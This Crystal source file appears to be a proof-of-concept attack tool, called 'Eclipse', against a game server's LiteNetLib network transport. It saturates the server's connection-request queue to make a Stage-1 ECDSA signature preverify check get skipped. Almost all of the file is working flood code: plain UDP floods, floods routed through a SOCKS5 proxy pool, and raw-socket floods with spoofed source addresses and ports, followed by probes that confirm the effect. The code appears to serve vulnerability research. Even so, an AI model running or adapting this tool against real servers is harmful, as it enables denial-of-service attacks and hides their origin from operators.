require "../packet"
require "../probe"
require "../raw_udp"
require "../target"
require "socket"
require "atomic"

module Strain
  # ECLIPSE — Finding A
  #
  # Demonstrates that under sustained pending-queue load the server's Stage-1
  # ECDSA preverify (CustomLiteNetLib4MirrorTransport.cs:242) gets bypassed.
  # The verify branch is gated on `flag2 = pending >= reconnectDelay/_lastPreAuthSpeed`
  # together with the `PreVerifySignatures` one-shot flag that resets every
  # 10 seconds (CustomNetworkManager.cs:178-190).
  #
  # NOT an auth bypass — Stage-2 ECDSA at line 488 still runs unconditionally.
  # The cold/hot/post pulse confirms the Stage-1 gate state transition only.
  #
  # The "eclipse" metaphor: under load, the verify gate is in shadow — packets
  # pass through unobserved by the cryptography until the next 10s tick
  # restores the light.
  module Eclipse
    record Config,
      target : Target,
      fibers : Int32,
      saturation : Time::Span,
      cooldown : Time::Span,
      hot_probes : Int32,
      raw_spoof : Bool,
      spoof_base : String,
      spoof_ips : Int32,
      spoof_ports : Int32,
      pps : Int32,
      proxy_pool : Socks5::Pool?

    record Outcome,
      cold : Probe::Result,
      hot : Array(Probe::Result),
      post : Probe::Result,
      packets_sent : Int64,
      endpoints : Int64,
      udp_drops_delta : Int64?,
      accepted_estimate : Int64?,
      verdict : String,
      reproduced : Bool

    # Eclipse only needs ~100 pending requests to push past flag2 (default
    # threshold = reconnectDelay / _lastPreAuthSpeed = 500/5 = 100). We
    # deliberately throttle so cascade overflow doesn't dominate -- otherwise
    # post pulse can't see gate restoration on the 10s tick.
    private FIBER_PACE = 200.microseconds

    private def self.run_proxy(cfg : Config, pool : Socks5::Pool) : Outcome
      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      pace_counter = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)

      puts "[1] cold pulse through SOCKS5"
      cold = Probe.shot(cfg.target, proxy_pool: pool)
      puts "    cold:  #{cold.rtt_ms.round(1).to_s.rjust(7)} ms  #{cold.label}"

      sleep cfg.cooldown

      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"
      puts "[2] SOCKS5 saturate (#{cfg.fibers} fibers, #{cfg.saturation.total_seconds.round(1)}s, #{rate_label})"
      done = Channel(Nil).new(cfg.fibers)
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          session = nil
          begin
            rng = Random.new
            buf = Packet.scratch
            session = pool.open(cfg.target)
            endpoint_counter.add(1_i64)
            loop do
              break if stop.get
              Packet.mutate!(buf, rng)
              begin
                RawUDP.pace_total_rate(pace_counter.add(1_i64), cfg.pps, flood_started_at)
                session.send(buf)
                counter.add(1_i64)
              rescue IO::Error | Socket::Error
                break
              end
              sleep FIBER_PACE
            end
          rescue ex
            STDERR.puts "    SOCKS5 worker stopped: #{ex.message}"
          ensure
            session.try &.close rescue nil
            done.send(nil)
          end
        end
      end

      sleep cfg.saturation

      puts "[3] hot pulse through SOCKS5 (during saturation, #{cfg.hot_probes} probes)"
      hot = [] of Probe::Result
      cfg.hot_probes.times do |i|
        r = Probe.shot(cfg.target, proxy_pool: pool)
        puts "    hot[#{i}]:#{r.rtt_ms.round(1).to_s.rjust(7)} ms  #{r.label}"
        hot << r
        sleep 0.7.seconds unless i == cfg.hot_probes - 1
      end

      stop.set(true)
      cfg.fibers.times { done.receive }

      sent_total = counter.get
      endpoints = endpoint_counter.get
      puts "    SOCKS5 saturate: #{sent_total} packets, #{endpoints} proxy sessions"

      puts "[4] post pulse through SOCKS5 (after 12s drain, expect gate restored)"
      sleep 12.seconds
      post = Probe.shot(cfg.target, proxy_pool: pool)
      puts "    post:  #{post.rtt_ms.round(1).to_s.rjust(7)} ms  #{post.label}"

      verdict, reproduced = classify(cold, hot, post)
      Outcome.new(cold, hot, post, sent_total, endpoints, nil, nil, verdict, reproduced)
    ensure
      stop.try &.set(true)
    end

    private def self.run_raw_spoof(cfg : Config) : Outcome
      target_ip = RawUDP.parse_ipv4_u32(cfg.target.host)
      source_base = RawUDP.validate_spoof_range!(cfg.spoof_base, cfg.spoof_ips, cfg.spoof_ports)
      max_endpoints = RawUDP.max_endpoints(cfg.spoof_ips, cfg.spoof_ports)
      packet_size = RawUDP.packet_size(Packet::SIZE)
      sockaddr = RawUDP.sockaddr(target_ip, cfg.target.port)

      probe_raw_fd = RawUDP.open_socket
      LibC.close(probe_raw_fd)

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      next_endpoint = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)

      puts "[1] cold pulse (no load)"
      cold = Probe.shot(cfg.target)
      puts "    cold:  #{cold.rtt_ms.round(1).to_s.rjust(7)} ms  #{cold.label}"

      sleep cfg.cooldown
      drops_before = RawUDP.udp_drops_for_port(cfg.target.port)

      done = Channel(Nil).new(cfg.fibers)
      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"
      puts "[2] raw-spoof saturate (#{cfg.fibers} fibers, #{cfg.saturation.total_seconds.round(1)}s, #{rate_label}, max endpoints #{max_endpoints})"
      flood_started_at = Time.monotonic
      cfg.fibers.times do
        spawn do
          raw_fd = -1
          begin
            raw_fd = RawUDP.open_socket
            rng = Random.new
            payload = Packet.scratch
            packet = Bytes.new(packet_size)
            batch = 0
            loop do
              break if stop.get
              seq = next_endpoint.add(1_i64)
              break if seq >= max_endpoints
              RawUDP.pace_total_rate(seq, cfg.pps, flood_started_at)
              src_ip, src_port = RawUDP.endpoint_at(source_base, cfg.spoof_ports, seq)

              Packet.mutate!(payload, rng)
              RawUDP.build_packet!(
                packet,
                payload,
                src_ip: src_ip,
                dst_ip: target_ip,
                src_port: src_port,
                dst_port: cfg.target.port,
                ident: seq.to_u32
              )

              if RawUDP.send_packet(raw_fd, sockaddr, packet)
                counter.add(1_i64)
                endpoint_counter.add(1_i64)
              end

              batch += 1
              Fiber.yield if batch & 0xff == 0
            end
          rescue ex
            STDERR.puts "    raw-spoof worker stopped: #{ex.message}"
          ensure
            LibC.close(raw_fd) if raw_fd >= 0
            done.send(nil)
          end
        end
      end

      sleep cfg.saturation

      puts "[3] hot pulse (during raw-spoof saturation, #{cfg.hot_probes} probes)"
      hot = [] of Probe::Result
      cfg.hot_probes.times do |i|
        r = Probe.shot(cfg.target)
        puts "    hot[#{i}]:#{r.rtt_ms.round(1).to_s.rjust(7)} ms  #{r.label}"
        hot << r
        sleep 0.7.seconds unless i == cfg.hot_probes - 1
      end

      stop.set(true)
      cfg.fibers.times { done.receive }
      sent_total = counter.get
      endpoints = endpoint_counter.get
      drops_after = RawUDP.udp_drops_for_port(cfg.target.port)
      drops_delta = if drops_before && drops_after
                      drops_after - drops_before
                    end
      accepted = RawUDP.accepted_estimate(sent_total, drops_delta)
      puts "    raw-spoof saturate: #{sent_total} packets, #{endpoints} endpoints"

      puts "[4] post pulse (after 12s drain, expect gate restored)"
      sleep 12.seconds
      post = Probe.shot(cfg.target)
      puts "    post:  #{post.rtt_ms.round(1).to_s.rjust(7)} ms  #{post.label}"

      verdict, reproduced = classify(cold, hot, post)
      Outcome.new(cold, hot, post, sent_total, endpoints, drops_delta, accepted, verdict, reproduced)
    ensure
      stop.try &.set(true)
    end

    def self.run(cfg : Config) : Outcome
      if pool = cfg.proxy_pool
        return run_proxy(cfg, pool)
      end
      return run_raw_spoof(cfg) if cfg.raw_spoof

      counter = Atomic(Int64).new(0_i64)
      endpoint_counter = Atomic(Int64).new(0_i64)
      pace_counter = Atomic(Int64).new(0_i64)
      stop = Atomic(Bool).new(false)

      puts "[1] cold pulse (no load)"
      cold = Probe.shot(cfg.target)
      puts "    cold:  #{cold.rtt_ms.round(1).to_s.rjust(7)} ms  #{cold.label}"

      sleep cfg.cooldown

      rate_label = cfg.pps > 0 ? "#{cfg.pps} pps" : "unlimited pps"
      puts "[2] saturate (#{cfg.fibers} fibers, #{cfg.saturation.total_seconds.round(1)}s, #{rate_label})"
      done = Channel(Nil).new(cfg.fibers)
      flood_started_at = Time.monotonic
      # Each fiber owns ONE long-lived socket -- gives a fixed-size pool of
      # src ports. LiteNetLib's per-IPEndPoint dedup in _requestsDict means
      # subsequent packets from the same fiber call UpdateRequest() and do NOT
      # create new _connectionRequests events. Total queue events stay near
      # cfg.fibers, which lets us trigger flag2 (>= 100 pending) without
      # collapsing the server into cascade-DoS territory.
      cfg.fibers.times do
        spawn do
          rng = Random.new
          buf = Packet.scratch
          dest = Socket::IPAddress.new(cfg.target.host, cfg.target.port)
          socket = UDPSocket.new
          begin
            socket.bind("0.0.0.0", 0)
            endpoint_counter.add(1_i64)
          rescue IO::Error
            done.send(nil)
            next
          end
          loop do
            break if stop.get
            Packet.mutate!(buf, rng)
            begin
              RawUDP.pace_total_rate(pace_counter.add(1_i64), cfg.pps, flood_started_at)
              socket.send(buf, to: dest)
              counter.add(1_i64)
            rescue IO::Error
              break
            end
            sleep FIBER_PACE
          end
          socket.close rescue nil
          done.send(nil)
        end
      end

      sleep cfg.saturation

      puts "[3] hot pulse (during saturation, #{cfg.hot_probes} probes)"
      hot = [] of Probe::Result
      cfg.hot_probes.times do |i|
        r = Probe.shot(cfg.target)
        puts "    hot[#{i}]:#{r.rtt_ms.round(1).to_s.rjust(7)} ms  #{r.label}"
        hot << r
        sleep 0.7.seconds unless i == cfg.hot_probes - 1
      end

      stop.set(true)
      cfg.fibers.times { done.receive }

      sent_total = counter.get
      puts "    saturate: #{sent_total} packets"

      puts "[4] post pulse (after 12s drain, expect gate restored)"
      sleep 12.seconds
      post = Probe.shot(cfg.target)
      puts "    post:  #{post.rtt_ms.round(1).to_s.rjust(7)} ms  #{post.label}"

      verdict, reproduced = classify(cold, hot, post)
      Outcome.new(cold, hot, post, sent_total, endpoint_counter.get, nil, nil, verdict, reproduced)
    end

    private def self.classify(cold : Probe::Result, hot : Array(Probe::Result), post : Probe::Result) : {String, Bool}
      cold_invalid = cold.reject_code == 0x02_u8
      hot_diverged = hot.any? { |r| r.reject_code != 0x02_u8 }
      post_invalid = post.reject_code == 0x02_u8

      if cold_invalid && hot_diverged
        msg = String.build do |s|
          s << "Eclipse REPRODUCED: Stage-1 ECDSA preverify shadowed under load.\n"
          s << "  cold  -> InvalidToken (Stage-1 verify ran).\n"
          s << "  hot   -> "
          s << (hot.map { |r| r.label }.uniq.join(" / "))
          s << " (Stage-1 skipped at line 250).\n"
          s << "  post  -> "
          s << post.label
          s << (post_invalid ? " (gate self-healed on 10s tick).\n" : " (gate did not heal — recheck timing).\n")
          s << "  Note: Stage-2 ECDSA at line 488 still runs unconditionally.\n"
          s << "  This is a DoS/degradation surface, NOT an auth bypass."
        end
        {msg, true}
      elsif cold_invalid && !hot_diverged
        {"Eclipse not reproduced: every hot probe still rejected as InvalidToken.\n  Try: --fibers 1024 or --saturation 8.", false}
      else
        {"Eclipse inconclusive: cold probe did not return InvalidToken (#{cold.label}).", false}
      end
    end
  end
end
